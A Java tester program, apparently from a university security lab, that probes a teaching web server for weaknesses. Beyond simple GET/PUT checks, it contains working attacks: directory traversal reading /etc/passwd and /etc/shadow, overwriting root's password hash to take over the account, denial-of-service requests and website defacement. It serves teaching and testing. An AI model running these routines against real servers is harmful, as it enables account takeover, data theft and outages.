package ch.zhaw.securitylab.simplewebserver;

import java.io.*;
import java.net.*;
import java.util.Calendar;
import java.util.StringTokenizer;
import java.util.Vector;
import java.text.SimpleDateFormat;

public class SimpleWebServerTester {

    // Hostname and port of the server to test
    private static String host;
    private static int port;

    // Flags to be set via command line parameters
    private static int attack = 0;

    // Some HTTP status messages
    private static final String STATUS_200 = "HTTP/1.0 200 OK";
    private static final String STATUS_201 = "HTTP/1.0 201 Created";
    private static final String STATUS_400 = "HTTP/1.0 400 Bad Request";
    private static final String STATUS_403 = "HTTP/1.0 403 Forbidden";
    private static final String STATUS_404 = "HTTP/1.0 404 Not Found";
    //private static final String STATUS_500 = "HTTP/1.0 500 Internal Error";
    //private static final String STATUS_501 = "HTTP/1.0 501 Not Implemented";

    // The hash of the password "test"
    private static final String ROOT_PASSWORD = "$6$FHbP7AAr$I3jzf/uNs4cv1qoJtFNioOYsDtGRZefEFGt.FoGtYmDLJ3kJTWaGra4kCHP70AdaMAQ0lP6r1ORpQX68ahb02/";

    /* Invokes the actual test(s) */
    private void run() throws IOException {

        System.out.println();

        /* Peform GET/PUT tests */
        if ((attack == 1) || (attack == 0)) {
            checkGET();
        }
        if ((attack == 1) || (attack == 0)) {
            checkPUT();
        }

        /* Try to compromise the root account */
        if ((attack == 2) || (attack == 0)) {
            runCompromiseRoot();
        }

        /* Send empty request line */
        if ((attack == 3) || (attack == 0)) {
            runEmptyRequest();
        }

        /* Send malformed request line */
        if ((attack == 4) || (attack == 0)) {
            runMalformedRequest();
        }

        /* Send long request */
        if ((attack == 5) || (attack == 0)) {
            runLongRequest();
        }

        /* Get long response */
        if ((attack == 6) || (attack == 0)) {
            runLongResponse();
        }

        /* Execute directory traversal */
        if ((attack == 7) || (attack == 0)) {
            runDirectoryTraversal();
        }

        /* Deface website */
        if ((attack == 8) || (attack == 0)) {
            runDefacement();
        }
    }

    /* Test 1a: Method to test correct upload */
    private void checkGET() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Test 1a: Check correct download (GET)... ");
        String request = "GET index.html HTTP/1.0\n\n";
        osw.write(request);
        osw.flush();
        System.out.println("done");
        try {
            String response = br.readLine();
            if (response.equals(STATUS_200)) {
                br.readLine();
                response = br.readLine();
                if (response.equals("Hello")) {
                    System.out.println("Test succeeded");
                } else {
                    System.out.println("Test not succeeded (200 OK received but wrong content: " + response + ")");
                }
            } else {
                System.out.println("Test not succeeded, status message: " + response);
            }
        } catch (Exception e) {
            System.out.println("An exception occured durign the test");
            e.printStackTrace();
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Test 1b: Method to test correct upload */
    private void checkPUT() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Test 1b: Check correct upload (PUT)... ");
        String now = getNow();
        String request = "PUT test HTTP/1.0\n\nTest - " + now;
        osw.write(request);
        osw.flush();
        socket.shutdownOutput();
        System.out.println("done");
        try {
            String response = br.readLine();
            if (response.equals(STATUS_201)) {
                System.out.println("Test succeeded");
            } else {
                System.out.println("Test not succeeded, status message: " + response);
            }
        } catch (Exception e) {
            System.out.println("An exception occured durign the test");
            e.printStackTrace();
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 2: Compromise the root account */
    private void runCompromiseRoot() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 2: Compromise root test... ");

        // Try to read shadow file
        String request = "GET /../../../../../../../../../../../../../../../etc/shadow HTTP/1.0\n\n";
        osw.write(request);
        osw.flush();
        String response = br.readLine();
        if (response.equals(STATUS_200)) {

            // Shadow file could be read, read lines
            br.readLine();
            Vector<String> shadowInput = new Vector<String>();
            String line = br.readLine();
            while (line != null) {
                shadowInput.add(line);
                line = br.readLine();
            }

            // Create new lines, replace root password
            Vector<String> shadowOutput = new Vector<String>();
            for (int i = 0; i < shadowInput.size(); ++i) {
                line = shadowInput.get(i);
                StringTokenizer st = new StringTokenizer(line, ":");
                if (st.nextToken().equals("root")) {
                    StringBuffer newLine = new StringBuffer("root:" + ROOT_PASSWORD + ":");
                    st.nextToken();
                    while (st.hasMoreTokens()) {
                        newLine.append(st.nextToken() + ":");
                    }
                    newLine.append("::");
                    shadowOutput.add(newLine.toString());
                } else {
                    shadowOutput.add(line);
                }
            }
            socket.close();

            // Try to write back shadow file
            socket = connect();
            osw = getWriter(socket);
            br = getReader(socket);
            osw.write("PUT /../../../../../../../../../../../../../../../etc/shadow HTTP/1.0\n\n");
            for (int i = 0; i < shadowOutput.size(); ++i) {
                line = shadowOutput.get(i);
                osw.write(line + "\n");
            }
            osw.flush();
            socket.shutdownOutput();
            System.out.println("done");
            response = br.readLine();
            if (response.equals(STATUS_201)) {
                System.out.println("Attack successful (compromized root by setting password to 'test')");
            } else if (response.equals(STATUS_403)) {
                System.out.println("Attack not successful (shadow file could not be written), correct status message received: " + response);
            } else {
                System.out.println("Attack not successful (shadow file could not be written), but wrong status message received: " + response);
            }
        } else if (response.equals(STATUS_404)) {
            System.out.println("done");
            System.out.println("Attack not successful (shadow file could not be read), correct status message received: " + response);
        } else {
            System.out.println("done");
            System.out.println("Attack not successful (shadow file could not be read), but wrong status message received: " + response);
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 3: Method to crash the server by sending an empty request */
    private void runEmptyRequest() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 3: Execute empty request test... ");
        String request = "\n\n";
        osw.write(request);
        osw.flush();
        System.out.println("done");
        try {
            String response = br.readLine();
            if (response.equals(STATUS_400)) {
                System.out.println("Attack not successful, correct status message received: " + response);
            } else {
                System.out.println("Attack not successful, but wrong status message received: " + response);
            }
        } catch (Exception e) {
            try {
                connectTest();
                System.out.println("Attack not successful, but no status message received");
            } catch (Exception e1) {
                System.out.println("Attack succeeded (DoS)");
            }
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 4: Method to crash the server by sending another malformed request  */
    private void runMalformedRequest() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 4: Execute malformed request test... ");
        String request = "GET \n\n";
        osw.write(request);
        osw.flush();
        System.out.println("done");
        try {
            String response = br.readLine();
            if (response.equals(STATUS_400)) {
                System.out.println("Attack not successful, correct status message received: " + response);
            } else {
                System.out.println("Attack not successful, but wrong status message received: " + response);
            }
        } catch (Exception e) {
            try {
                connectTest();
                System.out.println("Attack not successful, but no status message received");
            } catch (Exception e1) {
                System.out.println("Attack succeeded (DoS)");
            }
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 5: Method to crash the server by sending a long request */
    private void runLongRequest() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 5: Execute long request test... ");
        int i = 0;

        // Send approx. 1000 MB data
        try {
            osw.write("GET /");
            for (; i < 100000000; ++i) {
                osw.write("10_Bytes__");
            }
            osw.write(" HTTP/1.0\n\n");
            osw.flush();
            System.out.println("done (connection not broken after " + (10 * i) + " Bytes sent)");
            String response = br.readLine();
            if (response.equals(STATUS_404)) {
                System.out.println("Attack not successful, correct status message received: " + response);
            } else {
                System.out.println("Attack not successful, but wrong status message received: " + response);
            }
        } catch (Exception e) {
            System.out.println("done (connection broken after " + (10 * i) + " Bytes sent)");
            try {
                connectTest();
                String response = br.readLine();
                if (response.equals(STATUS_404)) {
                    System.out.println("Attack not successful, correct status message received: " + response);
                } else {
                    System.out.println("Attack not successful, but wrong status message received: " + response);
                }
            } catch (Exception e1) {
                System.out.println("Attack succeeded (DoS)");
            }
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 6: Method to crash the server by fetching a long file */
    private void runLongResponse() throws IOException {
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 6: Execute long response test... ");
        String request = "GET /endless_file HTTP/1.0\n\n";
        osw.write(request);
        osw.flush();

        // Fetch data
        int receivedBytes = 0;
        try {
            String response = br.readLine();
            br.readLine();
            while (br.read() >= 0) {
                receivedBytes++;
            }
            System.out.println("done (reveived " + receivedBytes + " Bytes)");
            if (response.equals(STATUS_200)) {
                System.out.println("Attack not successful, correct status message received: " + response);
            } else {
                System.out.println("Attack not successful, but wrong status message received: " + response);
            }
        } catch (Exception e) {
            System.out.println("done (connection broken after " + receivedBytes + " Bytes reveived)");
            System.out.println("Attack succeeded");
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 7: Method to perform a directory traversal attack */
    private void runDirectoryTraversal() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 7: Execute directory traversal test... ");
        String request = "GET /../../../../../../../../../../../../../../../etc/passwd HTTP/1.0\n\n";
        osw.write(request);
        osw.flush();
        System.out.println("done");
        String response = br.readLine();
        if (response.equals(STATUS_200)) {
            System.out.println("Attack succeeded (information disclosure), look what I just got:");
            String line;
            for (int i = 0; i < 20; ++i) {
                line = br.readLine();
                if (line == null) {
                    break;
                }
                if (i > 0) {
                    System.out.println(line);
                }
            }
            System.out.println("...");
        } else if (response.equals(STATUS_404)) {
            System.out.println("Attack not successful, correct status message received: " + response);
        } else {
            System.out.println("Attack not successful, but wrong status message received: " + response);
        }
        socket.close();
        checkServerStillRunning();
    }

    /* Attack 8: Method to perform Website Defacement */
    private void runDefacement() throws IOException {
        checkServerRunning();
        Socket socket = connect();
        OutputStreamWriter osw = getWriter(socket);
        BufferedReader br = getReader(socket);
        System.out.print("Attack 8: Execute defacement test... ");
        String now = getNow();
        String request = "PUT /../index.html HTTP/1.0\n\nDEFACED - " + now;
        osw.write(request);
        osw.flush();
        socket.shutdownOutput();
        System.out.println("done");
        String response1 = br.readLine();
        socket.close();
        try {
            socket = connect();
            osw = getWriter(socket);
            br = getReader(socket);
            request = "GET /index.html HTTP/1.0\n\n";
            osw.write(request);
            osw.flush();
            br.readLine();
            br.readLine();
            String response2 = br.readLine();
            if (response2.equals("DEFACED - " + now)) {
                System.out.println("Attack succeeded (defacement)");
            } else if (response1.equals(STATUS_403)) {
                System.out.println("Attack not successful, correct status message received: " + response1);
            } else {
                System.out.println("Attack not successful, but wrong status message received: " + response1);
            }
        } catch (Exception e) {
            System.out.println("An exception occured durign the test");
            e.printStackTrace();
        }
        socket.close();
        checkServerStillRunning();
    }


    /* Establishes a connection */
    private Socket connect() throws IOException {
        return new Socket(host, port);
    }

    /* Gets a BufferedReader from a socket */
    private BufferedReader getReader(Socket socket) throws IOException {
        return new BufferedReader(new InputStreamReader(socket.getInputStream()));
    }

    /* Gets an OutputStreamWriter from a socket */
    private OutputStreamWriter getWriter(Socket socket) throws IOException {
        return new OutputStreamWriter(socket.getOutputStream());
    }

    /* Tests if the connection can be established */
    private void connectTest() throws IOException {
        Socket socket = connect();
        socket.close();
    }

    /* Tests if the server is running at all */
    private void checkServerRunning() {
        try {
            connectTest();
        } catch (Exception e) {
            System.out.println("Server does not appear to be running, exiting\n");
            System.exit(0);
        }
    }

    /* Tests if the server is still running */
    private void checkServerStillRunning() {
        try {
            Thread.sleep(1000);
            connectTest();
            System.out.println("Server still running\n");
        } catch (Exception e) {
            System.out.println("Server crashed\n");
        }
    }

    /* Get the current timestamp */
    private String getNow() {
        final String DATE_FORMAT_NOW = "yyyy-MM-dd HH:mm:ss";
        Calendar cal = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat(DATE_FORMAT_NOW);
        return sdf.format(cal.getTime());
    }

    /* This method is called when the program is run from the command line */
    public static void main(String argv[]) throws IOException {

        /* Create a SimpleWebServerTester object, and run it */
        try {
            host = argv[0];
            port = Integer.parseInt(argv[1]);
            if (argv.length > 2) {
                attack = Integer.parseInt(argv[2]);
                if ((attack < 0) || (attack > 8)) {
                    throw (new Exception());
                }
            }
        } catch (Exception e) {
            System.out.println("Usage: java SimpleWebServerTester hostname port {0-8}\n");
            System.exit(0);
        }
        SimpleWebServerTester swst = new SimpleWebServerTester();
        swst.run();
    }
}
